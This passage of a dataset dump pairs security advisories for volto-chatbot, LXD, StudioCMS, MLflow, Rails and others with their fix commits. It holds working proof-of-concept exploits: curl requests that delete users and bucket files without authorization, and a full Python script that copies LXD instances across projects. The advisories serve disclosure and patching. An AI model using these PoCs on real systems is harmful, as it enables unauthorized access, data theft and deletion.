+  FILE vllm/entrypoints/pooling/typing.py
+FIX commit https://github.com/vllm-project/vllm/commit/ee17d0d869203ef9a35ad73358a4987bba14b1fc status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-w9x9-j56r-h98r sev=high pkgs=['npm:@eeacms/volto-chatbot']
+src=https://github.com/eea/volto-chatbot cwes=['CWE-862']
+SUMMARY: @eeacms/volto-chatbot has Unauthenticated Danswer API Confused Deputy Proxy
+DESC: ## Unauthenticated Danswer API Confused Deputy Proxy in @eeacms/volto-chatbot ### Summary `@eeacms/volto-chatbot` exposes an Express middleware route (`**/_v1_da/**`) that accepts unauthenticated HTTP requests from any network client and proxies them to the configured upstream Danswer API, automatically attaching the server-side service credentials (`DANSWER_API_KEY` or session cookie). Because no authorization check, path allowlist, or method restriction is applied before the upstream request is issued, an unauthenticated attacker can invoke arbitrary Danswer API operations — including privileged admin endpoints — as the configured service account. This is a classic Confused Deputy attack: the Volto proxy acts as a deputy that carries credentials on behalf of the attacker. ### Details The vulnerability is introduced across two source files in `@eeacms/volto-chatbot@2.0.3`. **Route registration (`src/index.js:15`):** ```js middleware.all('**/_v1_da/**', proxyMiddleware); ``` The wildcard pattern matches every HTTP method and any sub-path, and no authentication middleware is chained before `proxyMiddleware`. This means all requests reaching any `/_v1_da/` path are forwarded without any identity check. **Unvalidated path extraction and upstream URL construction (`src/middleware.js:228-230`):** ```js const path = req.url.replace('/_v1_da/', '/'); const reqUrl = `${process.env.DANSWER_URL || ''}/api${path}`; ``` The attacker-controlled `req.url` is transformed into the upstream Danswer path with a simple string replace. There is no allowlist of permitted paths, no restriction on HTTP methods, and no validation of the resulting URL. The attacker therefore fully controls which Danswer endpoint is called and with which HTTP method. **Credential attachment and forwarding (`src/middleware.js:164`, `src/middleware.js:169`, `src/middleware.js:202`):** ```js // Session-cookie path (line 164): headers = { Cookie: cached_auth_cookie, ... } // API-key path (line 169): Authorization: 'Bearer ' + api_key, // Sink — final upstream dispatch (line 202): const response = await fetch(url, options, req.body); ``` After constructing the URL from attacker-supplied input, the middleware attaches the server-side Danswer credentials (either a cached login session cookie or a `Bearer` API key) and dispatches the request. The response from Danswer is then relayed back to the unauthenticated client. **Complete data flow (source → sink):** 1. `src/index.js:15` — all `**/_v1_da/**` paths registered to `proxyMiddleware` with no auth guard (source: external HTTP request). 2. `src/middleware.js:228` — `req.url` used directly to derive the upstream path without allowlist. 3. `src/middleware.js:230` — attacker-controlled path appended to `${DANSWER_URL}/api`. 4. `src/middleware.js:164` / `src/middleware.js:169` — server-side session cookie or API key attached. 5. `src/middleware.js:202` — `fetch(url, options, req.body)` sends the fully-credentialed request to the Danswer backend (sink). This vulnerability is present whenever the add-on middleware is installed and `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` is configured — conditions required for normal, documented operation of the package. ### PoC The following steps reproduce the vulnerability using the Docker-based test harness provided with this report. **Prerequisites:** - Docker installed - Python 3 with the `requests` library **Step 1 — Build the Docker image (from the `npmAI_719_eea__volto-chatbot/` parent directory):** ```bash docker build \ -f vuln-001/Dockerfile \ -t vuln001-proxy \ reports/npmAI_719_eea__volto-chatbot ``` The image packages the unmodified `src/middleware.js` from `@eeacms/volto-chatbot@2.0.3`, a minimal Express server that wires the vulnerable middleware, and an in-container mock Danswer server that echoes every received request as JSON. The environment variable `DANSWER_API_KEY=supersecret` is set to simulate a real deployment. **Step 2 — Start the container:** ```bash docker run --rm -d -p 3000:3000 --name vuln001-test vuln001-proxy ``` This launches both the Volto proxy (port 3000) and the mock Danswer server (port 18080) inside the container. **Step 3 — Run the PoC exploit script:** ```bash python3 vuln-001/poc.py 127.0.0.1 3000 ``` **What the script does:** 1. Waits for the proxy to accept TCP connections. 2. Sends an unauthenticated `POST` request with a JSON body to the admin-only Danswer endpoint via the proxy: ``` POST http://127.0.0.1:3000/_v1_da/admin/users/delete Content-Type: application/json {"id": "victim-user-123"} ``` No `Authorization` or `Cookie` header is sent by the client. **Expected output (exploit confirmed):** ``` [+] === EXPLOIT CONFIRMED — PASS === [+] Decisive evidence: 1. Attacker-controlled path reached upstream : url='/api/admin/users/delete' 2. Server-side API key forwarded (no client auth) : authorization='Bearer supersecret' 3. Attacker-controlled HTTP method forwarded : method='POST' ``` The mock Danswer server receives `POST /api/admin/users/delete` with `Authorization: Bearer supersecret` — proving that the attacker controlled both the upstream path and the HTTP method while the server silently attached its own credentials. **Equivalent manual curl command (without Docker):** ```bash # Terminal 1 — mock Danswer server node - <<'NODE' require('http').createServer((req, res) => { let b = ''; req.on('data', c => b += c); req.on('end', () => { res.setHeader('content-type', 'application/json'); res.end(JSON.stringify({ method: req.method, url: req.url, authorization: req.headers.authorization || null, body: b })); }); }).listen(18080, () => console.log('mock Danswer on :18080')); NODE # Terminal 2 — Volto with Danswer credentials configured DANSWER_URL=http://127.0.0.1:18080 DANSWER_API_KEY=secret yarn start # Terminal 3 — unauthenticated exploit request curl -i -X POST 'http://localhost:3000/_v1_da/admin/users/delete' \ -H 'Content-Type: application/json' \ --data '{"id":"victim-user-123"}' ``` The r [...]
+FIX commit https://github.com/eea/volto-chatbot/commit/eaf18b7c0f23560086b300bf0c5e62f9f76ad7b0 status=200
+  MSG: fix: Security - whitelist middleware paths to prevent Confused Deputy attacks on and proxy endpoints
+  FILE CHANGELOG.md
+    +### :lock: Security
+    +- Security: whitelist middleware paths to prevent Confused Deputy attacks on `_v1_da` and `_v1_ha` proxy endpoints [Tiberiu Ichim - [`a459b36`](https://github.
+
+=== GHSA-r77c-2cmr-7p47 sev=low pkgs=['npm:openclaw']
+src=https://github.com/openclaw/openclaw cwes=['CWE-862']
+SUMMARY: OpenClaw: Delivery queue recovery could lose group tool-policy context for media replay
+DESC: ## Summary Delivery queue recovery could lose group tool-policy context for media replay. ## Affected Packages / Versions - Package: `openclaw` - Ecosystem: npm - Affected versions: `>= 2026.4.10 < 2026.4.14` - Patched versions: `>= 2026.4.14` ## Impact Recovered queued outbound media could be replayed without the original session context needed to enforce group tool policy, weakening channel media restrictions after restart/recovery. ## Technical Details The fix persists and replays the relevant session context with delivery queue entries so recovered media dispatch goes through the same policy checks. ## Fix The issue was fixed in #66025. The first stable tag containing the fix is `v2026.4.14`, and `openclaw@2026.4.14` includes the fix. ## Fix Commit(s) - `48aae82bbc19ba8b0741e61a08063eb0d1df464e` - PR: #66025 ## Release Process Note Users should upgrade to `openclaw` 2026.4.14 or newer. The latest npm release, `2026.4.14`, already includes the fix. ## Credits Thanks to @zsxsoft, with sponsorship from @KeenSecurityLab and @qclawer for reporting this issue.
+FIX pull https://github.com/openclaw/openclaw/pull/66025 status=200
+  PR: fix(outbound): replay queued session context | ## Summary - Preserve outbound session context when write-ahead queue entries are replayed after restart - Keep queued outbound media policy evaluation aligned with the original delivery context ## Changes - Persist the optional outbound `session` object in queued delivery entries - Replay the stored `session` object during queue recovery delivery - Add storage and recovery regression tests coveri
+  MSG: fix(outbound): replay queued session context (#66025) * fix(outbound): preserve replay session context * fix(outbound): remove user work log * changelog: note outbound session-context replay fix (#660
+  FILE CHANGELOG.md
+    +- Outbound/delivery-queue: persist the originating outbound `session` context on queued delivery entries and replay it during recovery, so write-ahead-queued s
+  FILE src/infra/outbound/deliver.ts
+    +        session: params.session,
+  FILE src/infra/outbound/delivery-queue-recovery.ts
+    +    session: entry.session,
+  FILE src/infra/outbound/delivery-queue-storage.ts
+    +import type { OutboundSessionContext } from "./session-context.js";
+    +  /** Session context needed to preserve outbound media policy on recovery. */
+    +  session?: OutboundSessionContext;
+    +    session: params.session,
+  FILE src/infra/outbound/delivery-queue.recovery.test.ts
+    +        session: {
+    +          key: "agent:main:main",
+    +          agentId: "agent-main",
+    +          requesterAccountId: "acct-1",
+    +          requesterSenderId: "sender-1",
+    +          requesterSenderName: "Sender One",
+    +          requesterSenderUsername: "sender.one",
+    +          requesterSenderE164: "+15551234567",
+    +        },
+    +        session: {
+    +          key: "agent:main:main",
+    +          agentId: "agent-main",
+    +          requesterAccountId: "acct-1",
+    +          requesterSenderId: "sender-1",
+    +          requesterSenderName: "Sender One",
+    +          requesterSenderUsername: "sender.one",
+    +          requesterSenderE164: "+15551234567",
+    +        },
+  FILE src/infra/outbound/delivery-queue.storage.test.ts
+    +          session: {
+    +            key: "agent:main:main",
+    +            agentId: "agent-main",
+    +            requesterAccountId: "acct-1",
+    +            requesterSenderId: "sender-1",
+FIX commit https://github.com/openclaw/openclaw/commit/48aae82bbc19ba8b0741e61a08063eb0d1df464e status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-5957-c7qm-m469 sev=low pkgs=['rubygems:actionmailbox']
+src=https://github.com/rails/rails cwes=['CWE-294']
+SUMMARY: Action Mailbox: Possible signature replay in Action Mailbox Mailgun ingress
+DESC: ### Impact The Action Mailbox Mailgun ingress authenticates a request with an HMAC of the `timestamp` and `token` parameters concatenated without a separator, and `ActionMailbox::Ingresses::Mailgun::InboundEmailsController::Authenticator#recent?` rejects only timestamps more than 2 minutes in the past. Because the signature does not fix the boundary between the two values, a captured signed request can be presented with a timestamp far in the future, which the ingress then accepts indefinitely. An attacker who obtains one signed Mailgun webhook request, but not the signing key, could submit arbitrary inbound email that Action Mailbox processes as genuine, possibly leading to forged messages attributed to the sender of the attacker's choosing. Applications that receive inbound email through the Action Mailbox Mailgun ingress are affected. ### Details The fixed releases also reject a Mailgun request whose timestamp is more than 2 minutes ahead of the server's clock, as they already did for one more than 2 minutes behind it. An application whose clock runs more than 2 minutes behind Mailgun's will now reject genuine webhooks and should synchronize its clock. ### Releases The fixed releases are available at the normal locations. Patches for those who cannot upgrade at once: - 8.1: https://github.com/rails/rails/commit/c3a295c5c22266e8ec4d0e664e6923a299235e7a.patch - 8.0: https://github.com/rails/rails/commit/4aa2ec66822bc4eb8b341a0608f1c90a3e371a34.patch ### Credit This issue was responsibly reported by HackerOne researcher [davutselcuk](https://hackerone.com/davutselcuk).
+FIX commit https://github.com/rails/rails/commit/4aa2ec66822bc4eb8b341a0608f1c90a3e371a34 status=200
+  MSG: Reject Mailgun timestamps from the future The Mailgun ingress rejected a timestamp more than 2 minutes old but accepted any timestamp ahead of local time. Allow 2 minutes of drift in both directions. 
+  FILE actionmailbox/CHANGELOG.md
+    +*   Reject Mailgun inbound emails whose timestamp is more than 2 minutes ahead
+    +    of local time.
+    +    [GHSA-5957-c7qm-m469]
+    +    *Mike Dalessio*
+  FILE actionmailbox/app/controllers/action_mailbox/ingresses/mailgun/inbound_emails_controller.rb
+    -            Time.at(timestamp) >= 2.minutes.ago
+    +            Time.at(timestamp).between?(2.minutes.ago, 2.minutes.from_now)
+  FILE actionmailbox/test/controllers/ingresses/mailgun/inbound_emails_controller_test.rb
+    +  test "receiving an inbound email from Mailgun with a timestamp slightly ahead of local time" do
+    +    assert_difference -> { ActionMailbox::InboundEmail.count }, +1 do
+    +      travel_to "2018-10-09 15:14:00 EDT"
+    +      post rails_mailgun_inbound_emails_url, params: {
+    +        timestamp: 1539112500,
+    +        token: "7VwW7k6Ak7zcTwoSoNm7aTtbk1g67MKAnsYLfUB7PdszbgR5Xi",
+    +        signature: "ef24c5225322217bb065b80bb54eb4f9206d764e3e16abab07f0a64d1cf477cc",
+    +        "body-mime" => file_fixture("../files/welcome.eml").read
+    +      }
+    +    end
+    +    assert_response :no_content
+    +  end
+    +  test "rejecting an inbound email from Mailgun with a timestamp from the future" do
+    +    original_timestamp = "1539112500"
+    +    original_token = "7VwW7k6Ak7zcTwoSoNm7aTtbk1g67MKAnsYLfUB7PdszbgR5Xi"
+    +    future_timestamp = original_timestamp + original_token[0]
+    +    shortened_token = original_token[1..]
+    +    # The signature covers the timestamp and token joined into one string, so it holds for any split of that string.
+    +    assert_equal original_timestamp + original_token, future_timestamp + shortened_token
+    +    assert_no_difference -> { ActionMailbox::InboundEmail.count } do
+    +      travel_to "2018-10-09 15:26:00 EDT"
+    +      post rails_mailgun_inbound_emails_url, params: {
+    +        timestamp: future_timestamp,
+    +        token: shortened_token,
+FIX commit https://github.com/rails/rails/commit/c3a295c5c22266e8ec4d0e664e6923a299235e7a status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-39p5-2wrr-xh29 sev=medium pkgs=['go:code.vikunja.io/api']
+src=https://github.com/go-vikunja/vikunja cwes=['CWE-200', 'CWE-639']
+SUMMARY: Vikunja: Any user can enumerate every team and its members by attaching arbitrary teams to a throwaway project
+DESC: ### Summary When you share a project with a team, the API lets you attach any team on the instance, including teams you have nothing to do with, as long as you're an admin of the project. Listing a project's teams then returns each team's full member roster. So any logged-in user can spin up a throwaway project, attach team IDs one by one, and read back the name, description, and complete member list of every team on the instance. Normally you can only see teams you belong to; this path ignores that. ### Details Sharing a project with a team is a two-step flow: you PUT a team to the project, then you GET the project's teams to see them. The share endpoint only enforces that you're an admin of the target project, it doesn't care whether the team you're referencing is one you're allowed to see. Any existing team ID is accepted. The listing endpoint is even more permissive: read access to the project is enough, which you obviously have on a project you created. And its response isn't just a list of team names, it includes each team's description, creator, and a full members array with every member's username, display name, and admin flag. Put together, an attacker who owns a single project can walk the team ID space and pull the roster of every team in the instance, including teams they aren't a member of. This contradicts how team visibility works everywhere else in the product, where you only ever see teams you belong to. Emails are stripped from the roster, so what leaks is identities and org structure rather than contact details. The fix is to require that the caller actually has access to the team they're attaching, not just to the project. ### PoC The attacker needs nothing but an ordinary account. 1. Create a throwaway project you own: 2. Attach team IDs one by one (sweep the range you want): ``` PUT /api/v1/projects/<your_project_id>/teams {<SNIP>, "team_id": <N>, <SNIP>} ``` 3. Read them back with their rosters: ``` GET /api/v1/projects/<your_project_id>/teams ``` Each entry contains the team name, description, creator, and a members array with every member's username, display name, and admin flag, for teams you are not a member of. ### Impact Information disclosure of the instance-wide team directory: team names, descriptions, and full membership, for teams the attacker has no relationship with. This maps out the organisation's group structure and who belongs where, useful for targeting and social engineering. Any authenticated account is enough; no share link, no admin rights, no victim interaction.
+FIX pull https://github.com/go-vikunja/vikunja/pull/3688 status=404
+
+=== GHSA-qx75-2p3r-pwm5 sev=high pkgs=['go:github.com/canonical/lxd']
+src=https://github.com/canonical/lxd cwes=['CWE-284']
+SUMMARY: LXD has project restriction bypass in instance copy across projects 
+DESC: Reported from https://github.com/lxc/incus/security/advisories/GHSA-c9f5-j9c3-mhrg ### Summary Missing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy the instance to a new project. This issue could allow an attacker to access secrets in instances they are not authorized to access. ### Details `cmd/incusd/instances.go` authorizes `POST /1.0/instances` against the target project. In the copy path, `cmd/incusd/instances_post.go` then loads the source instance from `req.Source.Project` without checking whether the caller can view that source instance. From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the instance to another server. ### PoC #### Setup We assume the target server is remotely accessible and a user/certificate has been added. ``` # create a new project and instance incus project create secrets incus profile show default | incus --project secrets edit default incus --project secrets init images:debian/trixie secret # restrict an existing certificate to prevent access to the project incus config trust edit cert-fp #> set, for example restricted: true projects: - default # verification, with the restricted certificate incus ls remote: ``` #### Exploitation The below script was partly generated. To copy the `secret` instance to the `default` project, the following command can be used. ``` python3 poc.py --url https://IP-REMOTE:8443 \ --cert path/to/client.crt --key path/to/client.key \ --target-project default --source-project secrets \ --source-instance secret --name copy-secret --insecure ``` Wait a bit for the instance to be copied, then `incus ls remote:` to see the copied instance. ``` #!/usr/bin/env python3 """Copy an instance from a project the caller should not be able to read.""" from __future__ import annotations import argparse import json import ssl import sys import urllib.error import urllib.parse import urllib.request def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes: ctx = ssl.create_default_context() if insecure: ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE ctx.load_cert_chain(cert, key) req = urllib.request.Request( url.rstrip("/") + path, data=json.dumps(body).encode(), method="POST", headers={"Content-Type": "application/json", "Accept": "application/json"}, ) try: with urllib.request.urlopen(req, context=ctx) as resp: return resp.read() except urllib.error.HTTPError as exc: sys.stderr.write(exc.read().decode(errors="replace") + "\n") raise def main() -> int: ap = argparse.ArgumentParser() ap.add_argument("--url", required=True) ap.add_argument("--cert", required=True) ap.add_argument("--key", required=True) ap.add_argument("--target-project", required=True) ap.add_argument("--source-project", required=True) ap.add_argument("--source-instance", required=True) ap.add_argument("--name", required=True, help="new instance name in target project") ap.add_argument("--instance-only", action="store_true") ap.add_argument("--start", action="store_true") ap.add_argument("--insecure", action="store_true") ap.add_argument("--dry-run", action="store_true") args = ap.parse_args() body = { "name": args.name, "source": { "type": "copy", "source": args.source_instance, "project": args.source_project, "instance_only": args.instance_only, }, "start": args.start, } path = "/1.0/instances?" + urllib.parse.urlencode({"project": args.target_project}) print(json.dumps(body, indent=2)) if args.dry_run: return 0 print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace")) return 0 if __name__ == "__main__": raise SystemExit(main()) ``` ### Impact An attacker can copy instances they don't normally have access to, possibly leading to information disclosure.
+FIX commit https://github.com/canonical/lxd/commit/97cb037794cb6b21c5a184eb5f3292207adbf6b2 status=200
+  MSG: lxd: check for can_view on source when copying instance Signed-off-by: Kadin Sayani <kadin.sayani@canonical.com>
+  FILE lxd/instances_post.go
+    +	"github.com/canonical/lxd/lxd/auth"
+    +	if req.Source.Type == api.SourceTypeCopy {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(errors.New("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		var sourceURL *api.URL
+    +		instanceName, snapshotName, isSnapshot := api.GetParentAndSnapshotName(req.Source.Source)
+    +		if isSnapshot {
+    +			sourceURL = entity.InstanceSnapshotURL(req.Source.Project, instanceName, snapshotName)
+    +		} else {
+    +			sourceURL = entity.InstanceURL(req.Source.Project, req.Source.Source)
+    +		}
+    +		err = s.Authorizer.CheckPermission(r.Context(), sourceURL, auth.EntitlementCanView)
+    +		if err != nil {
+    +			return response.SmartError(err)
+    +		}
+    +	}
+FIX commit https://github.com/canonical/lxd/commit/bc1e20ea32dff6ae2df08803eee82832959ec80e status=200
+  MSG: lxd: check for view permission on source project when copying instance This effectively fixes the https://github.com/canonical/lxd/security/advisories/GHSA-qx75-2p3r-pwm5 Inspired-by: https://github.c
+  FILE lxd/instances_post.go
+    +	if req.Source.Type == "copy" {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(fmt.Errorf("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		if !s.Authorizer.UserHasPermission(r, req.Source.Project, "view") {
+    +			return response.Forbidden(nil)
+    +		}
+    +	}
+FIX commit https://github.com/canonical/lxd/commit/f7849615eb89e71a12ea76daaab6110bdf0fdf7f status=200
+  MSG: lxd: check for can_view on source when copying instance This effectively fixes the https://github.com/canonical/lxd/security/advisories/GHSA-qx75-2p3r-pwm5. Signed-off-by: Kadin Sayani <kadin.sayani@c
+  FILE lxd/instances_post.go
+    +	"github.com/canonical/lxd/lxd/auth"
+    +	"github.com/canonical/lxd/shared/entity"
+    +	if req.Source.Type == api.SourceTypeCopy {
+    +		if req.Source.Source == "" {
+    +			return response.BadRequest(errors.New("Must specify a source instance"))
+    +		}
+    +		if req.Source.Project == "" {
+    +			req.Source.Project = targetProjectName
+    +		}
+    +		var sourceURL *api.URL
+    +		instanceName, snapshotName, isSnapshot := api.GetParentAndSnapshotName(req.Source.Source)
+    +		if isSnapshot {
+    +			sourceURL = entity.InstanceSnapshotURL(req.Source.Project, instanceName, snapshotName)
+    +		} else {
+    +			sourceURL = entity.InstanceURL(req.Source.Project, req.Source.Source)
+    +		}
+    +		err = s.Authorizer.CheckPermission(r.Context(), sourceURL, auth.EntitlementCanView)
+    +		if err != nil {
+    +			return response.SmartError(err)
+    +		}
+    +	}
+
+=== GHSA-mm78-fgq8-6pgr sev=high pkgs=['npm:@studiocms/s3-storage']
+src=https://github.com/withstudiocms/studiocms cwes=['CWE-863']
+SUMMARY: StudioCMS S3 Storage Manager Authorization Bypass via Missing `await` on Async Auth Check
+DESC: ## Summary The S3 storage manager's `isAuthorized()` function is declared `async` (returns `Promise<boolean>`) but is called without `await` in both the POST and PUT handlers. Since a Promise object is always truthy in JavaScript, `!isAuthorized(type)` always evaluates to `false`, completely bypassing the authorization check. Any authenticated user with the lowest `visitor` role can upload, delete, rename, and list all files in the S3 bucket. ## Details The `isAuthorized` function is typed as returning `Promise<boolean>` in `packages/studiocms/src/handlers/storage-manager/definitions.ts:88`: ```typescript export type ParsedContext = { getJson: () => Promise<ContextJsonBody>; getArrayBuffer: () => Promise<ArrayBuffer>; getHeader: (name: string) => string | null; isAuthorized: (type?: AuthorizationType) => Promise<boolean>; // async }; ``` Both context drivers implement it as `async` — `packages/studiocms/src/handlers/storage-manager/core/effectify-astro-context.ts:32`: ```typescript isAuthorized: async (type) => { switch (type) { case 'headers': { // ... token verification ... const isEditor = level >= UserPermissionLevel.editor; if (!isEditor) return false; return true; } default: { const isEditor = locals.StudioCMS.security?.userPermissionLevel.isEditor || false; return isEditor; } } }, ``` But in the S3 storage manager, it's called without `await` — `packages/@studiocms/s3-storage/src/s3-storage-manager.ts:200`: ```typescript if (authRequiredActions.includes(jsonBody.action) && !isAuthorized(type)) { return { data: { error: 'Unauthorized' }, status: 401 }; } ``` And again at line 372 (PUT handler): ```typescript if (!isAuthorized(type)) { return { data: { error: 'Unauthorized' }, status: 401 }; } ``` `isAuthorized(type)` returns a `Promise` object. `!Promise{...}` is always `false` because a Promise is truthy. The 401 response is never returned. **Execution flow:** 1. Visitor-role user sends POST to `/studiocms_api/integrations/storage/manager` 2. `AstroLocalsMiddleware` verifies session exists — passes (visitor is logged in) 3. Handler calls `!isAuthorized('locals')` → evaluates `!Promise{...}` = `false` 4. Authorization check is skipped entirely 5. Visitor performs the requested storage operation ## PoC ```bash # 1. Log in as a visitor-role user and obtain session cookie # 2. List all files in S3 bucket (should require editor+) curl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \ -H 'Cookie: studiocms-session=<visitor-session-token>' \ -H 'Content-Type: application/json' \ -d '{"action":"list","prefix":""}' # Expected: 401 Unauthorized # Actual: 200 with full bucket listing # 3. Upload a file as visitor (should require editor+) curl -X PUT 'http://localhost:4321/studiocms_api/integrations/storage/manager' \ -H 'Cookie: studiocms-session=<visitor-session-token>' \ -H 'Content-Type: application/octet-stream' \ -H 'x-storage-key: malicious/payload.html' \ --data-binary '<h1>Uploaded by visitor</h1>' # Expected: 401 Unauthorized # Actual: 200 File uploaded # 4. Delete a file as visitor (should require editor+) curl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \ -H 'Cookie: studiocms-session=<visitor-session-token>' \ -H 'Content-Type: application/json' \ -d '{"action":"delete","key":"important/document.pdf"}' # Expected: 401 Unauthorized # Actual: 200 File deleted ``` ## Impact - Any authenticated visitor gains full S3 storage management (upload, delete, rename, list) — capabilities restricted to editor role and above - Attacker can delete arbitrary files from the S3 bucket, causing data loss - Attacker can list all files and generate presigned download URLs, exposing all stored content - Attacker can upload arbitrary files or rename existing ones, replacing legitimate content with malicious payloads ## Recommended Fix Add `await` to both `isAuthorized()` calls in `packages/@studiocms/s3-storage/src/s3-storage-manager.ts`: ```typescript // POST handler (line 200) — before: if (authRequiredActions.includes(jsonBody.action) && !isAuthorized(type)) { // After: if (authRequiredActions.includes(jsonBody.action) && !(await isAuthorized(type))) { // PUT handler (line 372) — before: if (!isAuthorized(type)) { // After: if (!(await isAuthorized(type))) { ```
+
+=== GHSA-gqch-g4w5-7qcw sev=high pkgs=['npm:mlflow']
+src=https://github.com/mlflow/mlflow cwes=['CWE-862']
+SUMMARY: MLflow: CreateModelVersion source validation does not check READ permission on referenced run_id
+DESC: ### Summary The `_validate_source_run` and `_validate_source_model` functions in `mlflow/server/handlers.py` verify that a model version source path is within the artifact directory of a specified run or logged model, but do not check whether the caller has READ permission on that run or model. An authenticated MLflow user can therefore reference another user's run_id in `CreateModelVersion`, creating a model version whose artifact URI points at the victim's artifact directory. If the calling user has MANAGE permission on the registered model (which they do after creation), they can then read arbitrary files from the victim's artifact directory via `GET /model-versions/get-artifact`, bypassing the experiment-level READ permission gate on `GET /get-artifact`. ### Details `POST /api/2.0/mlflow/model-versions/create` is protected: the caller must have UPDATE permission on the registered model. However, the source/run_id validation performed inside `_validate_source_run` only verifies path containment, not caller authorization: ```python # mlflow/server/handlers.py _validate_source_run() def _validate_source_run(source: str, run_id: str) -> None: if is_local_uri(source): if run_id: store = _get_tracking_store() run = store.get_run(run_id) # <-- no permission check on run_id source = pathlib.Path(local_file_uri_to_path(source)).resolve() if is_local_uri(run.info.artifact_uri): run_artifact_dir = pathlib.Path(...).resolve() if run_artifact_dir in [source, *source.parents]: return # validation passes raise MlflowException(...) ``` After creation, the model version's `source` and `run_id` point at the victim's artifact directory. The caller can read files from that directory via the model version artifact handler, which derives the artifact path from the stored `source`: ``` GET /model-versions/get-artifact?name=<model>&version=<v>&path=<file> ``` This bypass matters in deployments where experiment-level permissions are explicitly restricted -- i.e., where the default_permission is NO_PERMISSIONS or the target experiment has no grant for the attacker. Without the bypass, `GET /get-artifact` for the victim's run would return 403; via the model version artifact handler it returns 200. ### PoC Prerequisites: MLflow v3.13.0, `--app-name basic-auth`, default_permission=NO_PERMISSIONS (or alice's experiment restricted). Alice owns experiment 2 and run ALICE_RUN_ID. Bob owns experiment 4. Bob has READ on his own resources but NOT on alice's experiment. 1. Alice uploads a private file: ```bash # file is at /mlruns/2/ALICE_RUN_ID/artifacts/secret_weights.txt echo "ALICE_SECRET_MODEL_WEIGHTS=0.42" > secret_weights.txt ``` 2. Bob directly tries to read alice's artifact -- blocked: ``` GET /get-artifact?run_id=ALICE_RUN_ID&path=secret_weights.txt HTTP/1.1 Authorization: Basic <bob credentials> ``` Response: HTTP 403 (when alice's experiment is private) 3. Bob creates a model version referencing alice's run_id as source anchor: ``` POST /api/2.0/mlflow/model-versions/create HTTP/1.1 Authorization: Basic <bob credentials> Content-Type: application/json {"name":"bob-model","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"} ``` Response: HTTP 200 ```json {"model_version":{"name":"bob-model","version":"1","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"}} ``` 4. Bob reads alice's private file via the model version artifact handler: ``` GET /model-versions/get-artifact?name=bob-model&version=1&path=secret_weights.txt HTTP/1.1 Authorization: Basic <bob credentials> ``` Response: HTTP 200 -- body contains `ALICE_SECRET_MODEL_WEIGHTS=0.42` Live-validated on v3.13.0 with default_permission=READ (the file download is confirmed 200 OK); impact escalates to a true bypass when default_permission=NO_PERMISSIONS. ### Impact An authenticated user who can create registered models can read arbitrary files from any other user's artifact directory, bypassing the experiment-level READ permission gate. Model weights, training data samples, and evaluation reports stored in a run's artifact directory are accessible. The attacker needs UPDATE (or MANAGE) permission on at least one registered model; with default_permission=READ, that is automatically granted to the model creator.
+FIX pull https://github.com/mlflow/mlflow/pull/24293 status=200
+  PR: Require read permission on the source run or model when creating a model version | ### Security advisory Fixes CVE-2026-69148 (GHSA-gqch-g4w5-7qcw). ### Related Issues/PRs Relates to #issue_number ### What changes are proposed in this pull request? `CreateModelVersion` (`POST /api/2.0/mlflow/model-versions/create`) is gated in the basic-auth plugin (`mlflow/server/auth/__init__.py`) only by a check on the caller's permission on the target registered model (the model they own). I
+  MSG: Require read permission on the source run or model when creating a model version (#24293) Signed-off-by: Pat Sukprasert <pattara.sk127@gmail.com> Co-authored-by: Claude <noreply@anthropic.com>
+  FILE mlflow/server/auth/__init__.py
+    +def validate_can_create_model_version():
+    +    # A model version anchors its `source` inside the artifact directory of the run/model
+    +    # named by `run_id`/`model_id`. Downstream artifact reads are gated on the model version's
+    +    # registered model, so without a read check here a caller could point `source` at another
+    +    # user's run/model and read those artifacts through their own registered model. Require read
+    +    # on the source run/model to keep create-time access consistent with artifact-read gating.
+    +    if not _validate_can_update_registered_model_or_prompt():
+    +        return False
+    +    body = request.get_json(force=True, silent=True)
+    +    body = body if isinstance(body, dict) else {}
+    +    # Presence of run_id/model_id means the version is anchored to that source, so require
+    +    # READ on it. Guard on presence (not truthiness): an explicitly-supplied empty id is
+    +    # denied here rather than being allowed to slip past the guard as if it were absent.
+    +    if "run_id" in body and not (body["run_id"] and _get_permission_from_run_id().can_read):
+    +        return False
+    +    if "model_id" in body and not (body["model_id"] and _get_permission_from_model_id().can_read):
+    +        return False
+    +    return True
+    -    CreateModelVersion: _validate_can_update_registered_model_or_prompt,
+    +    CreateModelVersion: validate_can_create_model_version,
+  FILE tests/server/auth/test_auth.py
+    +@pytest.mark.parametrize(
+    +    "client",
+    +    [{"MLFLOW_AUTH_CONFIG_PATH": "fixtures/no_permission_auth.ini"}],
+    +    indirect=True,
+    +)
+    +def test_create_model_version_requires_read_on_source_run(
+    +    client: MlflowClient, monkeypatch: pytest.MonkeyPatch
+    +):
+    +    username1, password1 = create_user(client.tracking_uri)
+    +    username2, password2 = create_user(client.tracking_uri)
+  FILE tests/server/auth/test_auth_workspace.py
+FIX commit https://github.com/mlflow/mlflow/commit/4bb7474771c3be808cd9e129defef9305f2869be status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-q4xf-7fw5-4x8v sev=medium pkgs=['composer:illuminate/auth']
+src=https://github.com/illuminate/auth cwes=['CWE-384']
+SUMMARY: Laravel Hijacked authentication cookies vulnerability
